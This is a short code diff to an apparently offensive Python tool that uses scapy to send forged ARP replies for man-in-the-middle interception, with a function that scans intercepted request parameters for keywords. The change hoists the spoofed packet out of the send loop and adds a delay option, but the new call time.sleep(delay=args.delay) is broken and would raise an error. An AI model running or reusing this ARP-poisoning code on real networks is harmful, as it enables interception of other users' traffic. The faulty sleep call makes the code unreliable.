@@ -36,11 +36,12 @@ def extractIds(packet):
             print(f"Keyword '{keyword}' found in the request parameters.")
     
 def arpSpoofing(pdst, psrc):
+    packet = scapy.ARP(op=2, pdst=pdst, hwdst=getMac(pdst), psrc=psrc)
     while spoof_running:
-        packet = scapy.ARP(op=2, pdst=pdst, hwdst=getMac(pdst), psrc=psrc)
         scapy.send(packet, verbose=args.verbose)
         if args.verbose:
             print(f"[*] Packets sent {packet_sent}")
+        time.sleep(delay=args.delay)
     cleanSpoof(pdst, psrc)
 
 def getMac(ip):
@@ -73,6 +74,7 @@ if __name__ == "__main__":
     parser.add_argument("--mitm")
     parser.add_argument("-t", "--target")
     parser.add_argument("--timeout", default=5)
+    parser.add_argument("--delay", default=5)
 
     args = parser.parse_args()
 
